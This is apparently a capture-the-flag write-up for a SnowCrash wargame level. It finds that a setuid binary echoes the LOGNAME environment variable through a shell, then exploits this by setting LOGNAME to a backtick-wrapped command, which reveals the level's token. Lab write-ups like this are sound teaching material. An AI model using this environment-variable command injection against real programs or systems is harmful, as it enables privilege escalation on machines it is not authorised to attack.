# Level 07
Enumerate:

    level07@SnowCrash:~$ ls
    level07
    level07@SnowCrash:~$ ./level07
    level07
    level07@SnowCrash:~$ strings level07
    ...
    echo %s
    getenv
    LOGNAME
    ...
    level07@SnowCrash:~$ env
    ...
    LOGNAME=level07
    ...
Let's see if level07 prints the LOGNAME env:

    level07@SnowCrash:~$ export LOGNAME=getflag
    level07@SnowCrash:~$ ./level07 
    getflag
Alright, now we can try the injection:

    level07@SnowCrash:~$ export LOGNAME='`getflag`'
    level07@SnowCrash:~$ ./level07 
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
